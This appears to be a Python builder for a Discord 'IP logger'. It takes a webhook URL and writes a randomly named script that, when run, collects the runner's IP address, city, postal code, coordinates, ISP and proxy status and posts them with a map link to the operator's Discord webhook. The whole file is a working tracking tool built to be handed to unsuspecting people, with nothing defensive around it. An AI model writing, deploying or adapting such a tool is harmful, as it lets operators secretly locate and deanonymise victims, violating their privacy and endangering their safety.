import os
import random
import string
import time
import json
from pystyle import Colors, Colorate

ascii_art = r"""
 _      __    __   __             __    __
| | /| / /__ / /  / /  ___  ___  / /__ / /  ___  ___ ____ ____ ____ 
| |/ |/ / -_) _ \/ _ \/ _ \/ _ \/  '_// /__/ _ \/ _ / _ / -_) __/
|__/|__/\__/_.__/_//_/\___/\___/_/\_\/____/\___/\_, /\_, /\__/_/
                                                /___//___/
"""
print(Colorate.Horizontal(Colors.blue_to_cyan, ascii_art))

webhook_url = input(Colorate.Horizontal(Colors.yellow_to_red, "[?] Enter your Discord webhook URL: "))

filename = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.py'

os.makedirs('built', exist_ok=True)
filepath = os.path.join('built', filename)

os.makedirs('log', exist_ok=True)

with open(filepath, 'w', encoding='utf-8') as f:
    f.write(f"""
import requests
import json
import os
from datetime import datetime

LOG_PATH = os.path.join("..", "log", "ip_logs.json")
WEBHOOK_URL = "{webhook_url}"

def load_log():
    if os.path.exists(LOG_PATH):
        try:
            with open(LOG_PATH, "r") as f:
                return json.load(f)
        except:
            return {{}}
    return {{}}

def save_log(data):
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=4)

def fetch_json(url, headers=None):
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json()
    except:
        return {{}}
    return {{}}

def get_ip_data():
    ipinfo = fetch_json("https://ipinfo.io/json")
    ip = ipinfo.get("ip", "N/A")

    ipapi = fetch_json(f"http://ip-api.com/json/{{ip}}?fields=66846719")
    ipwho = fetch_json(f"https://ipwho.is/{{ip}}")

    data = {{
        "IP": ip,
        "City": ipinfo.get("city", "N/A"),
        "Region": ipinfo.get("region", "N/A"),
        "Country": ipinfo.get("country", "N/A"),
        "Loc": ipinfo.get("loc", "N/A"),
        "Postal": ipinfo.get("postal", "N/A"),
        "Org": ipinfo.get("org", "N/A"),
        "Hostname": ipinfo.get("hostname", "N/A"),
        "Timezone": ipinfo.get("timezone", "N/A"),

        "ISP": ipapi.get("isp", "N/A"),
        "Proxy": str(ipapi.get("proxy", "N/A")),
        "Mobile": str(ipapi.get("mobile", "N/A")),
        "Hosting": str(ipapi.get("hosting", "N/A")),

        "Map": f"https://www.google.com/maps/search/?api=1&query={{ipinfo.get('loc', '')}}",
        "Timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }}

    return data

def is_new_ip(ip, logs):
    return ip not in logs

def send_webhook(data):
    embed = {{
        "title": "🌐 IP Logger Information",
        "color": 0x1ABC9C,
        "fields": [
            {{"name": "IP Address", "value": data.get("IP", "N/A"), "inline": True}},
            {{"name": "City", "value": data.get("City", "N/A"), "inline": True}},
            {{"name": "Region", "value": data.get("Region", "N/A"), "inline": True}},
            {{"name": "Country", "value": data.get("Country", "N/A"), "inline": True}},
            {{"name": "Postal Code", "value": data.get("Postal", "N/A"), "inline": True}},
            {{"name": "Organization", "value": data.get("Org", "N/A"), "inline": False}},
            {{"name": "Hostname", "value": data.get("Hostname", "N/A"), "inline": True}},
            {{"name": "ISP", "value": data.get("ISP", "N/A"), "inline": True}},
            {{"name": "Proxy", "value": data.get("Proxy", "N/A"), "inline": True}},
            {{"name": "Mobile Connection", "value": data.get("Mobile", "N/A"), "inline": True}},
            {{"name": "Hosting", "value": data.get("Hosting", "N/A"), "inline": True}},
            {{"name": "Timezone", "value": data.get("Timezone", "N/A"), "inline": True}},
            {{"name": "Google Maps", "value": f"[View Location]({{data.get('Map', '')}})", "inline": False}},
        ],
        "footer": {{
            "text": f"Logged at {{data.get('Timestamp', '')}}",
            "icon_url": "https://i.imgur.com/IpL0e3I.png"
        }},
        "thumbnail": {{
            "url": "https://i.imgur.com/IpL0e3I.png"
        }}
    }}

    payload = {{
        "username": "IP Logger",
        "avatar_url": "https://i.imgur.com/IpL0e3I.png",
        "embeds": [embed]
    }}

    try:
        r = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        if r.status_code != 204:
            print(f"[!] Failed to send webhook, status: {{r.status_code}}")
    except Exception as e:
        print(f"[!] Exception while sending webhook: {{e}}")

def main():
    logs = load_log()
    data = get_ip_data()
    ip = data.get("IP", "N/A")

    if ip == "N/A":
        print("[!] Could not fetch IP data.")
        return

    if not is_new_ip(ip, logs):
        return

    send_webhook(data)
    logs[ip] = data
    save_log(logs)

if __name__ == "__main__":
    main()
""")

print(Colorate.Horizontal(Colors.green_to_blue, f"[✓] Logger script generated here: {filepath}"))
print(Colorate.Horizontal(Colors.green_to_blue, "[!] Run the generated .py file to log IP info to Discord"))

time.sleep(5)